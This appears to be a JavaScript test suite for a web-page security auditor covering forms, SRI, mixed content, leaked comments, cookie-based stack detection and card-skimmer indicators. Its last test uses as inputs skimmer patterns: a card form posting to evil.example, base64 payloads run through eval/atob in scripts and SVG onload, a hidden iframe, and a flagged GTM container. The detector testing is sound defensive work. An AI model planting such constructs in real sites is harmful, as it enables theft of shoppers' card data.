import test from 'node:test';
import assert from 'node:assert/strict';
import { auditHtml, cookieTech } from '../src/core/html.js';
import { t, setLang } from '../src/i18n.js';

const PAGE = 'https://shop.example.org/';
const HTML = `<html><body>
<!-- TODO: remove /internal/debug before release -->
<!-- [if IE]> old <![endif] -->
<form action="https://forms.other.net/x"><input type="hidden" name="csrf_token" value="abcdef1234567890"></form>
<form action="http://shop.example.org/login"></form>
<script src="https://cdn.other.net/lib.js"></script>
<script src="https://cdn.other.net/ok.js" integrity="sha384-x"></script>
<script src="/own.js"></script>
<img src="http://img.other.net/a.png">
<a href="/x" target="_blank">x</a><a href="/y" target="_blank" rel="noopener">y</a>
<button onclick="go()">go</button>
<p>Traceback (most recent call last): File "app.py"</p>
<script>var s = "Traceback (most recent call last)";</script>
</body></html>`;

test('auditHtml: формы, SRI, смешанный контент, ссылки, комментарии, ошибки', () => {
  const titles = auditHtml(HTML, PAGE).map((f) => f.title);
  assert.deepEqual(titles.sort(), [
    'Error or stack trace on the page', 'External file without SRI: cdn.other.net', 'Form posts to another site: forms.other.net', 'Form sends data over HTTP',
    'HTML comment: TODO: remove /internal/debug before release', 'Hidden field with a token: csrf_token', 'Inline event handlers: 1', 'Links with target=_blank without rel=noopener: 1', 'Mixed content: img.other.net'
  ].sort());
  const c = auditHtml(HTML, PAGE).find((f) => /comment/.test(f.title));
  assert.equal(c.line, 2);
});

test('auditHtml: на http-странице пароль — высокий риск, смешанного контента нет', () => {
  const f = auditHtml('<form><input type="password" name="p"></form><img src="http://x/a.png">', 'http://a.test/');
  assert.deepEqual(f.map((x) => [x.title, x.risk]), [['Password field on an HTTP page', 3]]);
});

test('auditHtml: тексты ошибок внутри script не считаются', () => {
  assert.equal(auditHtml('<script>throw "Fatal error: x"</script>', PAGE).length, 0);
});

test('auditHtml: находки переводятся на русский', () => {
  setLang('ru');
  for (const f of auditHtml(HTML, PAGE)) { assert.match(t(f.title), /[А-Яа-я]/, f.title); f.why.forEach((w) => assert.match(t(w), /[А-Яа-я]/, w)); }
  setLang('en');
});

test('cookieTech: стек по именам cookies', () => {
  assert.deepEqual(cookieTech(['PHPSESSID', 'cf_clearance', 'theme']).sort(), ['Cloudflare', 'PHP']);
  assert.deepEqual(cookieTech(['JSESSIONID', 'connect.sid']).sort(), ['Express', 'Java']);
});

test('A6: признаки скиммеров', () => {
  const t = (h) => auditHtml(h, 'https://shop.example/checkout').map((f) => f.title + ':' + f.risk);
  const card = '<input autocomplete="cc-number">';
  assert.ok(t(card + '<form action="https://evil.example/c">').includes('Card form posts to a host not on the payment list: evil.example:3'));
  assert.ok(!t(card + '<form action="https://api.stripe.com/x">').some((x) => x.startsWith('Card form posts')));
  assert.ok(t('<script>setTimeout(atob("' + 'QUJD'.repeat(60) + '"))</script>').includes('Inline script runs a long base64 payload:3'));
  assert.ok(t('<svg onload="eval(atob(\'eA==\'))"></svg>').includes('SVG or pixel onload handler:3'));
  assert.ok(t(card + '<iframe src="https://x.example/p" width="0" height="0"></iframe>').includes('Hidden frame to x.example:3'));
  assert.ok(t('<script>gtm("GTM-P6KZMF63")</script>').includes('Known skimmer GTM container GTM-P6KZMF63:4'));
  assert.ok(t('<script>gtm("GTM-ABCD12")</script>').includes('GTM container GTM-ABCD12:0'));
});
